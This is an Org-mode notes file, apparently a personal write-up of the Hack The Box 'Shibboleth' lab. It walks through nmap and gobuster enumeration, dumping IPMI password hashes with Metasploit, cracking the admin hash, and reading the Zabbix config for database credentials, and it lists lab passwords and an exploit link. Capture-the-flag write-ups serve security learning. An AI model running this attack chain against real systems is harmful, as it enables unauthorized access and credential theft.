@@ -1,0 +1,202 @@
+#+TITLE: HTB - Shibboleth
+#+AUTHOR: Leonardo Tamiano
+
+* Enumeration
+** nmap
+*** nmap -sC -sV shibboleth
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-28 04:22 CET
+Nmap scan report for shibboleth (10.129.192.44)
+Host is up (0.049s latency).
+Not shown: 999 closed ports
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://shibboleth.htb/
+Service Info: Host: shibboleth.htb
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds
+    #+end_example
+
+*** nmap -p- shibboleth
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-28 04:22 CET
+Nmap scan report for shibboleth (10.129.192.44)
+Host is up (0.049s latency).
+Not shown: 65534 closed ports
+
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 15.71 seconds    
+    #+end_example
+
+*** sudo nmap -sU shibboleth.htb -p 623
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-28 04:52 CET
+Nmap scan report for shibboleth.htb (10.129.192.44)
+Host is up (0.049s latency).
+rDNS record for 10.129.192.44: shibboleth
+
+PORT    STATE SERVICE
+623/udp open  asf-rmcp
+
+Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
+    #+end_example
+
+** gobuster
+*** gobuster vhost -w ~/repos/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u shibboleth.htb -r
+    #+begin_example
+==============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://shibboleth.htb
+[+] Method:       GET
+[+] Threads:      10
+[+] Wordlist:     /home/leo/repos/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2021/11/28 04:39:38 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]
+Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]
+Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]        
+    #+end_example
+** metasploit
+*** msf6 > use auxiliary/scanner/ipmi/ipmi_version
+    #+begin_example
+msf6 auxiliary(scanner/ipmi/ipmi_version) > show options
+
+Module options (auxiliary/scanner/ipmi/ipmi_version):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   BATCHSIZE  256              yes       The number of hosts to probe in each set
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file   RPORT      623              yes       The target port (UDP)
+   THREADS    10               yes       The number of concurrent threads
+
+msf6 auxiliary(scanner/ipmi/ipmi_version) > set RHOSTS shibboleth.htb
+RHOSTS => shibboleth.htb
+msf6 auxiliary(scanner/ipmi/ipmi_version) > run
+
+[*] Sending IPMI requests to 10.129.192.44->10.129.192.44 (1 hosts)
+[+] 10.129.192.44:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, n[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed    
+    #+end_example
+
+*** msf6 auxiliary(scanner/ipmi/ipmi_version) > use auxiliary/scanner/ipmi/ipmi_dumphashes
+    #+begin_example
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
+
+Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
+
+   Name                  Current Setting               Required  Description
+   ----                  ---------------               --------  -----------
+   CRACK_COMMON          true                          yes       Automatically crack common passwords as they are
+                                                                  obtained
+   OUTPUT_HASHCAT_FILE                                 no        Save captured password hashes in hashcat format
+   OUTPUT_JOHN_FILE                                    no        Save captured password hashes in john the ripper
+                                                                  format
+   PASS_FILE             /usr/share/metasploit-framew  yes       File containing common passwords for offline cra
+                         ork/data/wordlists/ipmi_pass            cking, one per line
+                         words.txt
+   RHOSTS                                              yes       The target host(s), range CIDR identifier, or ho
+                                                                 sts file with syntax 'file:<path>'
+   RPORT                 623                           yes       The target port
+   SESSION_MAX_ATTEMPTS  5                             yes       Maximum number of session retries, required on c
+                                                                 ertain BMCs (HP iLO 4, etc)
+   SESSION_RETRY_DELAY   5                             yes       Delay between session retries in seconds
+   THREADS               1                             yes       The number of concurrent threads (max one per ho
+                                                                 st)
+   USER_FILE             /usr/share/metasploit-framew  yes       File containing usernames, one per line
+                         ork/data/wordlists/ipmi_user
+                         s.txt
+
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS shibboleth.htb
+RHOSTS => shibboleth.htb
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
+
+[+] 10.129.192.44:623 - IPMI - Hash found: Administrator:ac8e086e820900002adf145e3530f35c53decaf791c86b0cada1f5bcf944dcb88071ac778bfdf4e3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:26cb991854a05a64da3c77f8c074180e9023da35
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed    
+    #+end_example
+*** ruby hmac_sha1_crack.rb ~/repos/shibboleth/pass ~/repos/wordlists/rockyou.txt
+
+    Il file ~pass~ era formattato come segue
+
+    #+begin_example
+Administrator:ac8e086e820900002adf145e3530f35c53decaf791c86b0cada1f5bcf944dcb88071ac778bfdf4e3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:26cb991854a05a64da3c77f8c074180e9023da35
+    #+end_example
+
+    <identifier>:<salt>:<hash>
+
+    #+begin_example
+[*] Found 0 passwords with 1 left (129319/s)
+[*] Found 0 passwords with 1 left (132009/s)
+Administrator:ac8e086e820900002adf145e3530f35c53decaf791c86b0cada1f5bcf944dcb88071ac778bfdf4e3a123456789abcdefa12345678
+da3c77f8c074180e9023da35:ilovepumkinpie1
+[*] Cracked 1 passwords with 0 left (131875/s)
+    #+end_example
+** web login
+
+   #+begin_example
+Administrator:ilovepumkinpie1
+   #+end_example
+   
+* PrivEsc
+** cat zabbix_server.conf | grep DB
+   #+begin_example
+cat zabbix_server.conf | grep DB
+### Option: DBHost
+# DBHost=localhost
+### Option: DBName
+# DBName=
+DBName=zabbix
+### Option: DBSchema
+# DBSchema=
+### Option: DBUser
+# DBUser=
+DBUser=zabbix
+### Option: DBPassword
+DBPassword=bloooarskybluh
+### Option: DBSocket
+# DBSocket=
+### Option: DBPort
+# DBPort=
+### Option: StartDBSyncers
+#       Number of pre-forked instances of DB Syncers.
+# StartDBSyncers=4
+### Option: DBTLSConnect
+#       verify_full - connect using TLS, verify certificate and verify that database identity specified by DBHost
+#       On MariaDB starting from version 10.2.6 "required" and "verify_full" values are supported.
+# DBTLSConnect=
+### Option: DBTLSCAFile
+#       (yes, if DBTLSConnect set to one of: verify_ca, verify_full)
+# DBTLSCAFile=
+### Option: DBTLSCertFile
+# DBTLSCertFile=
+### Option: DBTLSKeyFile
+# DBTLSKeyFile=
+### Option: DBTLSCipher
+# DBTLSCipher=
+### Option: DBTLSCipher13
+# DBTLSCipher13=   
+   #+end_example
+
+** DB credentials
+   #+begin_example
+db_name = zabbix
+db_user = zabbix
+db_password = bloooarskybluh   
+   #+end_example
+
+* Resources
+  https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/
+  https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/
+  https://github.com/rapid7/metasploit-framework/blob/master/tools/password/hmac_sha1_crack.rb
+  http://fish2.com/ipmi/cipherzero.html
+  https://github.com/Al1ex/CVE-2021-27928
